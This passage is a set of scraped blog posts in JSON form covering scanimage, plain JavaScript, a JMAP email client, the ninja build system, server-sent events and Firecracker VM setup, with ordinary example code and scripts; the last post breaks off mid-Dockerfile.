{"url": "https://jvns.ca/blog/2020/07/11/scanimage--scan-from-the-command-line/", "title": "scanimage: scan from the command line!", "content": "\n     \n\n Here’s another quick post about a command line tool I was delighted by. \n\n Last night, I needed to scan some documents for some bureaucratic reasons. I’d never used a scanner on Linux before and I was worried it would take hours to figure out. I started by using  gscan2pdf  and had trouble figuring out the user interface – I wanted to scan both sides of the page at the same time (which I knew our scanner supported) but couldn’t get it to work. \n\n enter scanimage! \n\n scanimage  is a command line tool, in the  sane-utils  Debian package. I think all Linux scanning tools use the  sane  libraries (“scanner access now easy”) so my guess is that it has similar abilities to any other scanning software. I didn’t need OCR in this case so we’re not going to talk about OCR. \n\n get your scanner’s name with  scanimage -L \n\n scanimage -L  lists all scanning devices you have. \n\n At first I couldn’t get this to work and I was a bit frustrated but it turned out that I’d connected the scanner to my computer, but not plugged it into the wall. Oops. \n\n Once everything was plugged in it worked right away. Apparently our scanner is called  fujitsu:ScanSnap S1500:2314 . Hooray! \n\n list options for your scanner with  --help \n\n Apparently each scanner has different options (makes sense!) so I ran this command to get the options for my scanner: \n\n scanimage --help -d 'fujitsu:ScanSnap S1500:2314' \n \n\n I found out that my scanner supported a  --source  option (which I could use to enable duplex scanning) and a  --resolution  option (which I changed to 150 to decrease the file sizes and make scanning faster). \n\n scanimage doesn’t output PDFs (but you can write a tiny script) \n\n The only downside was – I wanted a PDF of my scanned document, and scanimage doesn’t seem to support PDF output. \n\n So I wrote this 5-line shell script to scan a bunch of PNGs into a temp directory and convert the resulting PNGs to a PDF. \n\n #!/bin/bash\nset -e\n\nDIR=`mktemp -d`\nCUR=$PWD\ncd $DIR\nscanimage -b --format png  -d 'fujitsu:ScanSnap S1500:2314' --source 'ADF Front' --resolution 150\nconvert *.png $CUR/$1\n \n\n I ran the script like this.  scan-single-sided output-file-to-save.pdf \n\n You’ll probably need a different  -d  and  --source  for your scanner. \n\n it was so easy! \n\n I always expect using printers/scanners on Linux to be a nightmare and I was really surprised how  scanimage  Just Worked – I could just run my script with  scan-single-sided receipts.pdf  and it would scan a document and save it to  receipts.pdf !. \n\n"},
{"url": "https://jvns.ca/blog/2020/06/19/a-little-bit-of-plain-javascript-can-do-a-lot/", "title": "A little bit of plain Javascript can do a lot", "content": "\n     \n\n I’ve never worked as a professional frontend developer, so even though I’ve\nbeen writing HTML/CSS/JS for 15 years for little side projects, all of the\nprojects have been pretty small, sometimes I don’t write any Javascript for\nyears in between, and I often don’t quite feel like I know what I’m doing. \n\n Partly because of that, I’ve leaned on libraries a lot! Ten years ago I used to\nuse jQuery, and since maybe 2017 I’ve been using a lot of vue.js for my little\nJavascript projects (you can see a  little whack-a-mole game I made here as an\nintro to Vue ). \n\n But last week, for the first time in a while, I wrote some plain\nJavascript without a library and it was fun so I wanted to talk about it a bit! \n\n experimenting with just plain Javascript \n\n I really like Vue. But last week when I started building\n https://questions.wizardzines.com , I had slightly different constraints than\nusual – I wanted to use the same HTML to generate both a PDF (with\n Prince ) and to make an interactive version of the questions. \n\n I couldn’t really see how that would work with Vue (because Vue wants to create\nall the HTML itself), and because it was a small project I decided to try\nwriting it in plain Javascript with no libraries – just write some HTML/CSS\nand add a single  <script src=\"js/script.js\"> </script> . \n\n I hadn’t done this in a while, and I learned a few things along the way that\nmade it easier than I thought it would be when I started. \n\n do almost everything by adding & removing CSS classes \n\n I decided to implement almost all of the UI by just adding & removing CSS\nclasses, and using  CSS transitions  if I want to animate a transition. \n\n here’s a small example, where clicking the “next” question button adds the “done” class to the parent div. \n\n div.querySelector('.next-question').onclick = function () {\n    show_next_row();\n    this.parentElement.parentElement.classList.add('done');\n}\n \n\n This worked pretty well. My CSS as always is a bit of a mess but it felt\nmanageable. \n\n add/remove CSS classes with  .classList \n\n I started out by editing the classes like this:  x.className = 'new list of\nclasses' . That felt a bit messy though and I wondered if there was a better\nway. And there was! \n\n You can also add CSS classes like this: \n\n let x = document.querySelector('div');\nx.classList.add('hi');\nx.classList.remove('hi');\n \n\n element.classList.remove('hi')  is way cleaner than what I was doing before. \n\n find elements with  document.querySelectorAll \n\n When I started learning jQuery I remember thinking that if you wanted to easily\nfind something in the DOM you had to use jQuery (like  $('.class') ).  I just\nlearned this week that you can actually write\n document.querySelectorAll('.some-class')  instead, and then you don’t need to\ndepend on any library! \n\n I got curious about when  querySelectorAll  was introduced. I Googled a tiny\nbit and it looks like the [Selectors API was built sometime between 2008 and\n2013 – I found a  post from the jQuery author discussing the proposed\nimplementation in\n2008 , and  a blog\npost from 2011 \nsaying it was in all major browsers by then, so maybe it didn’t exist when I\nstarted using jQuery but it’s definitely been around for quite a while :) \n\n set  .innerHTML \n\n In one place I wanted to change a button’s HTML contents. Creating DOM elements\nwith  document.createElement  is pretty annoying, so I tried to do that as\nlittle as possible and instead set  .innerHTML  to the HTML string I wanted: \n\n     button.innerHTML = `<i class=\"icon-lightbulb\"></i>I learned something!\n    <object data=\"/confetti.svg\" width=\"30\" height = \"30\"> </object>\n    `;\n \n\n scroll through the page with  .scrollIntoView \n\n The last fun thing I learned about is  .scrollIntoView  – I wanted to scroll down to the next question automatically when someone clicked “next question”. Turns out this is just one line of code: \n\n row.classList.add('revealed');\nrow.scrollIntoView({behavior: 'smooth', block: 'center'});\n \n\n another vanilla JS example: peekobot \n\n Another small example of a plain JS library I thought was nice is\n peekobot , which is a little chatbot\ninterface that’s 100 lines of JS/CSS. \n\n Looking at  its Javascript ,\nit uses some similar patterns – a lot of  .classList.add , some adding\nelements to the DOM, some  .querySelectorAll . \n\n I learned from reading peekobot’s source about\n .closest \nwhich finds the closest ancestor that matches a given selector. That seems like\nit would be a nice way to get rid of some of the  .parentElement.parentElement \nthat I was writing in my Javascript, which felt a bit fragile. \n\n plain Javascript can do a lot! \n\n I was pretty surprised by how much I could get done with just plain JS. I ended\nup writing about 50 lines of JS to do everything I wanted to do, plus a bit\nextra to collect some anonymous metrics about what folks were learning. \n\n As usual with my frontend posts, this isn’t meant to be Serious Frontend\nEngineering Advice – my goal is to be able to write little websites with less\nthan 200 lines of Javascript that mostly work. If you are also flailing around\nin frontend land I hope this helps a bit! \n\n"},
{"url": "https://jvns.ca/blog/2020/08/18/implementing--focus-and-reply--for-fastmail/", "title": "Implementing 'focus and reply' for Fastmail with JMAP", "content": "\n     \n\n Last month I switched my email to Fastmail. One fun thing about Fastmail is\nthat they built a new protocol called  JMAP  which is much\neasier to use than IMAP. So over the last couple of days I built a fun tiny\nemail feature for myself to use with JMAP. \n\n The point of this post is mostly to give a simple end-to-end example of how to\nuse the JMAP API because I couldn’t find a lot of  examples when I was figuring\nit out.  Here’s the github repo  and a  gist which shows how to authenticate & make your first request . \n\n cool feature from Hey: focus & reply \n\n I tried the  https://hey.com  email service for a little bit when it came out. It wasn’t for me, but I\nliked their “focus and reply” feature. Here’s a screenshot of what it looks like (from a video on their  marketing site page for the feature ) \n\n \n\n Basically it makes replying to a lot of emails in a batch a little simpler. So\nI thought – can I use JMAP to implement this focus & reply feature from Hey? \n\n step 0: make the feature simpler \n\n I was a bit too scared to actually send email to start (read-only is safe!), so\nI decided to start by just making a UI that would show me all the emails I\nneeded to reply to and give me a text box to fill in the replies. Then I could\ncopy and paste the replies into my webmail client to send them. This is a\nlittle janky, but I don’t mind it for now. \n\n Here’s an example of what that looks like: \n\n \n\n step 0.5: have a “Reply Later” folder in Fastmail \n\n I already had a folder named “Reply Later” in Fastmail, where I manually filed away\nemails that I needed to reply to but hadn’t gotten to yet. So I had a data\nsource to use! Hooray. Time to start coding. \n\n step 1: get started with JMAP \n\n I couldn’t find a quickstart guide for using JMAP with Fastmail and I was confused about how to do it for quite a while, so\npart of my goal with this blog post is to give an example of how to get started. I put all the code you need to make your first API request\nin a gist:\n fastmail-jmap-quickstart.js \n\n You can authenticate all your requests with HTTP Basic authentication with\nyour username and a Fastmail app password. \n\n Here’s the basics of how it works. \n\n \n Make a GET request to  https://jmap.fastmail.com/.well-known/jmap . This gives\nyou a “session” in response, gives you your account ID. You need\nthis account ID for all the other API calls. I found this a bit surprising\nbecause I usually expect things in  .well-known  to be static files, but\nthis one is a dynamic endpoint that you authenticate to with HTTP Basic\nauthentication. (using your email / app password) \n Use that account ID to make requests to the JMAP API at  https://jmap.fastmail.com/api/ \n \n\n One thing that threw me off about JMAP at first is that you have to wrap all your API requests with \n\n {\n    \"using\": [ \"urn:ietf:params:jmap:core\", \"urn:ietf:params:jmap:mail\" ],\n    \"methodCalls\": YOUR_REQUEST_HERE\n}\n \n\n For example, this is a request to get a list of all your mailboxes (folders). I think  \"0\"  is the ID of the request: \n\n {\n    \"using\": [ \"urn:ietf:params:jmap:core\", \"urn:ietf:params:jmap:mail\" ],\n    \"methodCalls\": [[ \"Mailbox/get\", {\n        \"accountId\": accountId,\n        \"ids\": null\n    }, \"0\" ]]\n}\n \n\n The API wasn’t that intuitive at first, but I was able to figure how to do what\nI wanted to by reading the spec at  https://jmap.io . \n\n step 2: get all my emails \n\n Here’s  the query I used to get my emails from JMAP .\nI basically just copied this from the examples in the JMAP documentation, but I\nthink it’s interesting that it’s not just 1 query, it’s actually 5 different\nchained queries that build on top of each other. For example, you have: \n\n [ \"Email/query\", {\n    \"accountId\": accountId,\n        // todo: actually do the reply later thing\n        \"filter\": { \"inMailbox\": mailbox_id },\n        \"sort\": [{ \"property\": \"receivedAt\", \"isAscending\": false }],\n        \"collapseThreads\": true,\n        \"position\": 0,\n        \"limit\": 20,\n        \"calculateTotal\": true\n}, \"t0\" ],\n[ \"Email/get\", {\n    \"accountId\": accountId,\n    \"#ids\": {\n        \"resultOf\": \"t0\",\n        \"name\": \"Email/query\",\n        \"path\": \"/ids\"\n    },\n    \"properties\": [ \"threadId\" ]\n}, \"t1\" ],\n...\n \n\n This queries for a list of all the email IDs in a specific mailbox (my “reply\nlater” mailbox), calls it  t0 , and then uses the results of  t0  to request\nall of those emails. \n\n One of the big ideas in JMAP seems to be this chaining – it really reduces\nlatency if you can do all your work in a single request. \n\n step 3: render the emails! \n\n Once I had all the emails, rendering them was pretty easy – I just used vue.js\n+ Tailwind. The whole thing came out to  170 lines of not-particularly-well-organized Javascript . \n\n the results \n\n It works! It’s already helped me reply to some emails.  The github repo is  https://github.com/jvns/focus-reply-fastmail . \n\n there are at least 2 problems with this code (and probably more): \n\n \n it’s storing passwords in local storage, which I think is not a good\nsecurity practice. \n it had some XSS vulnerabilities, which I think I’ve finally fixed by putting\nthe plaintext email in a  <pre>  (so that newlines come through) and\nescaping any HTML entities in there. ( <pre>{{email}}</pre> , in Vue) \n \n\n fastmail seems to use JMAP in a different way than this \n\n I got curious so I used the Network tab to look at how Fastmail’s web interfaces uses jmap. \n\n \n Fastmail’s webmail interface doesn’t seem to use  https://jmap.fastmail.com/  – instead it uses  https://www.fastmail.com/jmap/api . Maybe it’s just a proxy they use so that the requests are being made to the same origin? Unclear. \n It also authenticates in a different way, using  Authorization: Bearer . It\nseems like this might be a better way to authenticate, but I haven’t found\nany information about how to get a  Bearer  authentication like this to use\ninstead of using an app password. \n The requests it sends are sometimes compressed with deflate for some reason\n(instead of gzip), which I guess is fine but it means it’s impossible to\nlook at them in dev tools because Firefox doesn’t understand deflate. Weird! \n \n\n some links to resources \n\n \n JMAP crash course  (which I only found after I’d already finished doing this but looks very useful!) \n Fastmail has  some JMAP sample code on github \n https://jmap.io/  for the specs \n https://github.com/cure53/DOMPurify  is an HTML sanitizer which looks useful for preventing XSS \n \n\n this seems like a fun way to do email experiments! \n\n I think the idea that anyone can just use JMAP to make fun email UI experiments\nwithout dealing with the Hard Parts of email is really fun! \n\n And it’s really cool that I could get this to work 100% as a frontend app,\nwithout any server code at all! All the email data is accessible via JMAP, so\nit seems extremely possible to just do everything with JMAP requests from the\nclient. \n\n"},
{"url": "https://jvns.ca/blog/2020/10/26/ninja--a-simple-way-to-do-builds/", "title": "ninja: a simple way to do builds", "content": "\n     \n\n Hello! Every so often I find a new piece of software I really like, and today\nI want to talk about one of my recent favourites:  ninja ! \n\n incremental builds are useful \n\n I do a lot of small projects where I want to set up incremental builds – for\nexample, right now I’m writing a zine about bash, and I have one  .svg  file\nfor each page of the zine. I need to convert the SVGs to PDFs, and I’d been\ndoing it something like this: \n\n for i in *.svg\ndo\n    svg2pdf $i $i.pdf # or ${i/.svg/.pdf} if you want to get really fancy\ndone\n \n\n This works fine, but my  svg2pdf  script is a little slow (it uses Inkscape), and it’s annoying\nto have to wait 90 seconds or whatever to rebuild all the PDFs when I’ve just updated 1 page. \n\n build systems are confusing \n\n In the past I’ve been pretty put off by using a Build System like make or bazel\nfor my small projects because bazel is this Big Complicated Thing and  make \nfeels a little arcane to me. I don’t really know how to use either of them. \n\n So for a long time I’ve just written a bash script or something for my builds\nand resigned myself to just waiting for a minute sometimes. \n\n ninja is an EXTREMELY SIMPLE build system \n\n But ninja is not complicated! Here is literally everything I know about ninja\nbuild file syntax: how to create a  rule  and a  build : \n\n a  rule  has a command and description (the description is just for humans to read so you can tell what it’s doing when it’s building your code) \n\n rule svg2pdf\n  command = inkscape $in --export-text-to-path --export-pdf=$out\n  description = svg2pdf $in $out\n \n\n the syntax for  build  is  build output_file: rule_name input_files . Here’s\none using the  svg2pdf  rule. The output goes in  $out  in the rule and the\ninput goes in  $in . \n\n build pdfs/variables.pdf: svg2pdf variables.svg\n \n\n That’s it! If you put those two things in a file called  build.ninja  and then run  ninja ,\nninja will run  inkscape variables.svg --export-text-to-path --export-pdf=pdfs/variables.pdf . And then if you run it again, it won’t run\nanything (because it can tell that you’ve already built  pdfs/variables.pdf  and you’re up to date) \n\n Ninja has a few more features than this (see  the manual ), but I haven’t used them yet. It was\noriginally built  for Chromium , so even with a small feature set it can support large builds. \n\n ninja files are usually automatically generated \n\n The magic of ninja is that instead of having to use some confusing Build\nLanguage that’s hard to remember because you use it so infrequently (like\nmake), instead the ninja language is SUPER simple, and if you want to do\nsomething complicated then you can generate the build file you want using any\nprogramming language you want. I find this this a lot easier because I know\nPython, but I can never remember anything about how the  make  language works. \n\n I like to make a  build.py  file or that looks something like this, that\ncreates the ninja build file and then runs  ninja : \n\n with open('build.ninja', 'w') as ninja_file:\n    # write some rules\n    ninja_file.write(\"\"\"\nrule svg2pdf\n  command = inkscape $in --export-text-to-path --export-pdf=$out\n  description = svg2pdf $in $out\n\"\"\")\n    \n    # some for loop with every file I need to build\n    for filename in things_to_convert:\n        ninja_file.write(f\"\"\"\nbuild {filename.replace('svg', 'pdf')}: svg2pdf {filename}\n\"\"\")\n\n# run ninja\nimport subprocess\nsubprocess.check_call(['ninja'])\n \n\n I’m sure there are a bunch of ninja best practices, but I don’t know them and\nfor my small projects I find this works well. \n\n meson is a build system that generates ninja files \n\n I don’t know too much about  Meson  yet,\nbut recently I was building a C program ( plocate , a faster alternative to  locate )\nand I noticed that instead of the usual  ./configure; make; make install ,\nthere were different build instructions: \n\n meson builddir\ncd builddir\nninja\n \n\n It seems like Meson is a build system for C/C++/Java/Rust/Fortran that can use\nninja as a backend. \n\n that’s all! \n\n I’ve been using ninja for a few months now. I really like it and it’s caused me\napproximately 0 build-related headaches which feels pretty magical to me. \n\n"},
{"url": "https://jvns.ca/blog/2021/01/12/day-36--server-sent-events-are-cool--and-a-fun-bug/", "title": "Server-sent events: a simple way to stream events from a server", "content": "\n     \n\n hello! Yesterday I learned about a cool new way of streaming events from a\nserver I hadn’t heard of before:  server-sent events ! They\nseem like a simpler alternative to websockets if you only need to have the server\nsend events. \n\n I’m going to talk about what they’re for, how they work, and a couple of bugs I\nran into while using them yesterday. \n\n the problem: streaming updates from a server \n\n Right now I have a web service that starts virtual machines, and the client\npolls the server until the virtual machine is up. But I didn’t want to be doing\npolling. \n\n Instead, I wanted to stream updates from the server. I told Kamal I was going\nto implement websockets to do this, and he suggested that server-sent events\nmight be a simpler alternative! \n\n I was like WHAT IS THAT??? It sounded like some weird fancy thing, and I’d\nnever heard of it before. So I looked it up. \n\n server-sent events are just HTTP requests \n\n Here’s how server-sent events work. I was SO DELIGHTED to learn that they’re just HTTP requests. \n\n \n The client makes a GET request to (for example)  https://yoursite.com/events \n The client sets  Connection: keep-alive  so that we can have a long-lived connection \n The server sets a  Content-Type: text/event-stream  header \n The server starts sending events that look like this: \n \n\n event: status\ndata: one\n \n\n For example, here’s what some server-sent events look like when I make a request with curl: \n\n $ curl -N 'http://localhost:3000/sessions/15/stream'\nevent: panda\ndata: one\n\nevent: panda\ndata: two\n\nevent: panda\ndata: three\n\nevent: elephant\ndata: four\n \n\n The server can send the events slowly over time, and the client can read them as they arrive. You can also put JSON or whatever you want in the events, like  data: {'name': 'ahmed'} \n\n The wire protocol is really simple (just set  event:  and  data:  and maybe  id:  and  retry:  if you want), so you don’t\nneed any fancy server libraries to implement server-sent events. \n\n the Javascript code is also super simple (just use  EventSource ) \n\n Here’s what the browser Javascript code to stream server-sent events looks like. (I got this example from the  MDN page on server-sent events ) \n\n You can either subscribe to all events, or have different handlers for\ndifferent types of events. Here I have a handler that just receives events with\ntype  panda   (like our server was sending in the previous section). \n\n const evtSource = new EventSource(\"/sessions/15/stream\", { withCredentials: true })\nevtSource.addEventListener(\"panda\", function(event) {\n  console.log(\"status\", event)\n});\n \n\n the client can’t send updates in the middle \n\n Unlike websockets, server-sent events don’t allow a lot of back-and-forth\ncommunication. (it’s in the name – the  server  sends all the events). The\nclient makes one request at the beginning, and then the server sends a bunch of responses. \n\n if the HTTP connection ends, it’s automatically restarted \n\n One big difference between making an HTTP request with  EventSource  and a regular HTTP request is this note from the\nMDN docs: \n\n \n By default, if the connection between the client and server closes, the connection is restarted. The connection is terminated with the .close() method. \n \n\n This is pretty weird, and I was really thrown off it by it at first: I opened a\nconnection, I closed it on the server side, and a couple of seconds later the\nclient made another request to my streaming endpoint! \n\n I think the idea here is that maybe the connection might get accidentally\ndisconnected before it’s done, so the client automatically reopens it to\nprevent that. \n\n So you have to explicitly close the connection by calling  .close()  if you don’t want the client\nto keep retrying. \n\n there are a few other features \n\n You can also set  id:  and  retry:  fields in server-sent events. It looks like\nif you set  id s on the events the server sends then when reconnecting, the\nclient will send a  Last-Event-ID  header with the last ID it received. Cool! \n\n I found the  W3C page on server-sent events  to be surprisingly readable. \n\n two bugs I ran into while setting up server-sent events \n\n I ran into a couple of problems using server-sent events with Rails that I\nthought were kinda interesting. One of them was actually caused by nginx, and\nthe other one was caused by rails. \n\n problem 1: I couldn’t pause in between sending events \n\n I had this weird bug where if I did: \n\n def handler\n    # SSE is Rails' built in server-sent events thing\n    sse = SSE.new(response.stream, event: \"status\")\n    sse.write('event')\n    sleep 1\n    sse.write('another event')\nend\n \n\n It would write the first event, but not the second event. I was SO MYSTIFIED by\nthis and went on a whole digression trying to understand how  sleep  in Ruby\nworks. But Cass (another Recurser) pointed me to a  Stack Overflow question \nwhere someone else had the same problem, which contained a surprising-to-me\nanswer! \n\n It turned out that the problem was that my Rails server was behind nginx, and\nthat nginx seemingly by default uses HTTP/1.0 to make requests to upstreams by default (why? in 2021? really? I’m sure there’s a good reason, probably backwards compatibility or something). \n\n So the client (nginx) would just close the connection\nafter the first event sent by the server. I think the reason why it worked if I  didn’t  pause\nbetween sending the 2 events  was basically that the server was racing with the\nclient to send the second part of the response before the connection closed,\nand if I sent it fast enough then the server won the race. \n\n I’m not sure exactly why using HTTP/1.0 made the client close the connection\n(maybe because the server writes 2 newlines at the end of each event?), but\nbecause server-sent events are a pretty new thing it’s not that surprising that\nthey’re not supported by HTTP/1.0 (which is Very Old). \n\n Setting  proxy_http_version 1.1  fixed that problem. Hooray! \n\n problem 2: events were being buffered \n\n Once I sorted that out, I had a second problem. This one was actually super\neasy to debug because Cass had already suggested  this other stackoverflow answer \nas a solution to the previous problem, and while that wasn’t what was causing\nProblem 1, it DID explain Problem 2. \n\n The problem was with this example code: \n\n def handler\n    response.headers['Content-Type'] = 'text/event-stream'\n    # Turn off buffering in nginx\n    response.headers['X-Accel-Buffering'] = 'no'\n    sse = SSE.new(response.stream, event: \"status\")\n    10.times do \n        sse.write('event')\n        sleep 1\n    end\nend\n \n\n I expected it to return 1 event per second for 10 seconds, but instead it\nwaited 10 seconds and returned 10 events all at once. That’s not how we want streaming\nto work! \n\n This turned out to because the Rack ETag middleware wanted to calculate an ETag\n(a hash of the response), and to do that it needed to have the whole response.\nSo I needed to disable ETag generation. \n\n The Stack Overflow answer recommended disabling the Rack ETag middleware\nentirely, but I didn’t want to do that so I went and looked at the  linked github issue . \n\n That github issue suggested a workaround I could apply to just the streaming endpoint, which was to set the  Last-Modified  header, which apparently bypasses the ETag middleware for some reason. \n\n So I set \n\n headers['Last-Modified'] = Time.now.httpdate\n \n\n and it worked!!! \n\n I also turned off buffering in nginx by setting the header  X-Accel-Buffering: no .\nI’m not 100% sure I needed to do that but it seems safer. \n\n stack overflow is amazing \n\n At first I was really 100% committed to debugging both of those bugs from first\nprinciples. Cass (another Recurser) pointed me to those two Stack Overflow\nthreads and at first I was skeptical of the solutions those threads were suggesting\n(I thought “I’m not using HTTP/1.0! And what does the ETag header have to do with\nanything??“). \n\n But it turned out that I  was  accidentally using HTTP/1.0, and that the Rack\nETag middleware  was  causing me problems. \n\n So maybe the moral of that story is that sometimes computers interact in weird\nways, other people have experienced computers interacting in the exact same\nweird ways in the past, and Stack Overflow sometimes has answers about why :) \n\n I do think it’s important to not just randomly try things from Stack Overflow\n(which nobody was suggesting in this case of course!). For both of these I\nreally had to think about them to understand what was happening and why\nchanging those settings made sense. \n\n that’s all! \n\n Today I’m going to keep working on implementing server-sent events, because I\nspent a lot of yesterday being distracted by the above bugs. It’s always such a\ndelight to learn about a new easy-to-use web technology that I’d never heard\nof. \n\n"},
{"url": "https://jvns.ca/blog/2021/01/23/firecracker--start-a-vm-in-less-than-a-second/", "title": "Firecracker: start a VM in less than a second", "content": "\n     \n\n Hello! I spent this whole past week figuring out how to use  Firecracker  and\nI really like it so far. \n\n Initially when I read about Firecracker being released, I thought it was just a\ntool for cloud providers to use – I knew that AWS Fargate and  https://fly.io \nused it, but I didn’t think that it was something that I could directly use\nmyself. \n\n But it turns out that Firecracker is relatively straightforward to use (or at\nleast as straightforward as anything else that’s for running VMs), the\ndocumentation and examples are pretty clear, you definitely don’t need to be a\ncloud provider to use it, and as advertised, it starts VMs really fast! \n\n So I wanted to write about using Firecracker from a more DIY “I just want to\nrun some VMs” perspective. \n\n I’ll start out by talking about what I’m using it for, and then I’ll explain a\nfew things I learned about it along the way. \n\n my goal: a game where every player gets their own virtual machine \n\n I’m working on a sort of game to help people learn command line tools by giving\nthem a problem to solve and a virtual machine to solve it in, a little like a\nCTF. It still basically exists only on my computer, but I’ve been working on it\nfor a while. \n\n Here’s a screenshot of one of the puzzles I’m working on right now. This one is about setting\nfile extended attributes with  setfacl . \n\n \n\n why not use containers? \n\n I wanted to use virtual machines and not containers for this project basically\nbecause I wanted to mimic a real production machine that the user has root\naccess to – I wanted folks to be able to set sysctls, use  nsenter , make\n iptables  rules, configure networking with  ip , run  perf , basically\nliterally anything. \n\n the problem: starting a virtual machine is slow \n\n I wanted people to be able to click “Start” on a puzzle and instantly launch a\nvirtual machine. Originally I was launching a DigitalOcean VM every time,\nbut they took about a minute to boot, I was getting really impatient waiting\nfor them every time, and I didn’t think it was an acceptable user experience\nfor people to have to wait a minute. \n\n I also tried using qemu, but for reasons I don’t totally understand, starting a\nVM with qemu was also kind of slow – it seemed to take at least maybe 20\nseconds. \n\n Firecracker can start a VM in less than a second! \n\n Firecracker says this about performance in their  specification : \n\n \n It takes <= 125 ms to go from receiving the Firecracker InstanceStart API\ncall to the start of the Linux guest user-space /sbin/init process. \n \n\n So far I’ve been using Firecracker to start relatively large VMs – Ubuntu VMs\nrunning systemd as an init system – and it takes maybe 2-3 seconds for them to\nboot. I haven’t been measuring that closely because honestly 5 seconds is fast\nenough and I don’t mind too much about an extra 200ms either way. \n\n But enough background, let’s talk about how to actually use Firecracker. \n\n here’s a “hello world” script to start a Firecracker VM \n\n I said at the beginning of this post that Firecracker is pretty straightforward to get started with. Here’s how. \n\n Firecracker’s  getting started  instructions\nare really good (they just work!) but it was separated into a bunch of steps\nand I wanted to see everything you have to do together in 1 shell script. So\nI wrote a short shell script you can use to start a Firecracker VM, and some\nquick instructions for how to use it. \n\n Running a script like this was the first thing I did when trying to wrap my\nhead around Firecracker. There’s basically 3 steps: \n\n step 1 : Download Firecracker from their  releases page  and put it somewhere \n\n step 2 : Run this script as root (you might have to edit the last line with the path to the  firecracker  binary if it’s not in root’s PATH) \n\n I also put this script in a gist:  firecracker-hello-world.sh .\nThe IP addresses here are chosen pretty arbitrarily. Most the script is just writing a JSON file. \n\n set -eu\n\n# download a kernel and filesystem image\n[ -e hello-vmlinux.bin ] || wget https://s3.amazonaws.com/spec.ccfc.min/img/hello/kernel/hello-vmlinux.bin\n[ -e hello-rootfs.ext4 ] || wget -O hello-rootfs.ext4 https://github.com/firecracker-microvm/firecracker-demo/raw/fea3897ccfab0387ce5cd4fa2dd49d869729d612/xenial.rootfs.ext4\n[ -e hello-id_rsa ] || wget -O hello-id_rsa https://raw.githubusercontent.com/firecracker-microvm/firecracker-demo/ec271b1e5ffc55bd0bf0632d5260e96ed54b5c0c/xenial.rootfs.id_rsa\n\nTAP_DEV=\"fc-88-tap0\"\n\n# set up the kernel boot args\nMASK_LONG=\"255.255.255.252\"\nMASK_SHORT=\"/30\"\nFC_IP=\"169.254.0.21\"\nTAP_IP=\"169.254.0.22\"\nFC_MAC=\"02:FC:00:00:00:05\"\n\nKERNEL_BOOT_ARGS=\"ro console=ttyS0 noapic reboot=k panic=1 pci=off nomodules random.trust_cpu=on\"\nKERNEL_BOOT_ARGS=\"${KERNEL_BOOT_ARGS} ip=${FC_IP}::${TAP_IP}:${MASK_LONG}::eth0:off\"\n\n# set up a tap network interface for the Firecracker VM to user\nip link del \"$TAP_DEV\" 2> /dev/null || true\nip tuntap add dev \"$TAP_DEV\" mode tap\nsysctl -w net.ipv4.conf.${TAP_DEV}.proxy_arp=1 > /dev/null\nsysctl -w net.ipv6.conf.${TAP_DEV}.disable_ipv6=1 > /dev/null\nip addr add \"${TAP_IP}${MASK_SHORT}\" dev \"$TAP_DEV\"\nip link set dev \"$TAP_DEV\" up\n\n# make a configuration file\ncat <<EOF > vmconfig.json\n{\n  \"boot-source\": {\n    \"kernel_image_path\": \"hello-vmlinux.bin\",\n    \"boot_args\": \"$KERNEL_BOOT_ARGS\"\n  },\n  \"drives\": [\n    {\n      \"drive_id\": \"rootfs\",\n      \"path_on_host\": \"hello-rootfs.ext4\",\n      \"is_root_device\": true,\n      \"is_read_only\": false\n    }\n  ],\n  \"network-interfaces\": [\n      {\n          \"iface_id\": \"eth0\",\n          \"guest_mac\": \"$FC_MAC\",\n          \"host_dev_name\": \"$TAP_DEV\"\n      }\n  ],\n  \"machine-config\": {\n    \"vcpu_count\": 2,\n    \"mem_size_mib\": 1024,\n    \"ht_enabled\": false\n  }\n}\nEOF\n# start firecracker\nfirecracker --no-api --config-file vmconfig.json\n \n\n step 3 : You have a VM running! \n\n You can also SSH into the VM like this, with the SSH key that the script downloaded: \n\n ssh -o StrictHostKeyChecking=false  root@169.254.0.21 -i hello-id_rsa\n \n\n You might notice that if you run  ping 8.8.8.8  inside this VM, it doesn’t\nwork: it’s not able to connect to the outside internet. I think I’m actually\ngoing to use a setup like this for my puzzles where people don’t need to\nconnect to the internet. \n\n The networking commands and the rootfs image in this script are from the\n firecracker-demo  repository which I found really helpful. \n\n how I put a Firecracker VM on the Docker bridge \n\n I had a couple of problems with this “hello world” setup though: \n\n \n I wanted to be able to SSH to them from a Docker container (because I was running my game’s webserver in  docker-compose ) \n I wanted them to be able to connect to the outside internet \n \n\n I struggled with trying to understand what a Linux bridge was and how it worked\nfor about a day before figuring out how to get this to work. Here’s a slight modification of the previous script\n firecracker-hello-world-docker-bridge.sh  \nwhich runs a Firecracker VM on the Docker bridge \n\n You can run it as root and SSH to the resulting VM like this (the IP is\ndifferent because it has to be in the Docker subnet). \n\n ssh -o StrictHostKeyChecking=false  root@172.17.0.21 -i hello-id_rsa\n \n\n It basically just changes 2 things: \n\n \n There’s an extra  sudo brctl addif docker0 $TAP_DEV  to add the VM’s network interface to the Docker bridge \n It changes the gateway in the kernel boot args to the Docker bridge network interface’s IP (172.17.0.1) \n \n\n My guess is that most people probably won’t want to use the Docker bridge, if\nyou just want the VM to be able to connect to the outside internet I think the\nbest way is to create a new bridge. \n\n In my application I’m actually using a bridge called  firecracker0  which is a\ndocker-compose network I made. It feels a little sketchy to be using a bridge\nmanaged by Docker in this way but for now it works so I’ll keep doing that\nunless I find a better way. \n\n how I built my own Firecracker images \n\n This “hello world” example is all very well and good, but you might say – ok,\nhow do I build my own images? \n\n Basically you have to do 2 things: \n\n \n Make a Linux kernel. I wanted a 5.8 kernel so I used the instructions in the\n firecracker docs on creating your own image \nfor compiling a Linux kernel and they worked. I was kind of intimidated by\nthis because I’d somehow never compiled a Linux kernel before, but I\nfollowed the instructions and it just worked the first time. I thought it\nwould be super slow but it actually took less than 10 minutes to compile\nfrom scratch. \n Make an  ext4  filesystem image with all the files you want in your VM’s filesystem. \n \n\n Here’s how I put together my filesystem. Initially I tried downloading Ubuntu’s\nfocal cloud image and extracting the root partition with  dd , but I couldn’t\nget it work. \n\n Instead, I did what the Firecracker docs suggested and I built a Docker\ncontainer and copied the contents of the container into a filesystem image. \n\n Here’s what the  Dockerfile  I used looked like approximately: (I haven’t\ntested this exact Dockerfile but I think it should work). The main things are\nthat you have to install some kind of init system because the default  ubuntu:20.04  image\ndoesn’t come with one because you don’t need one in a container. I also ran\n unminimize  to restore some man pages because the container is for interactive\nuse. \n\n FROM ubuntu:20.04\nRUN apt-get update\nRUN 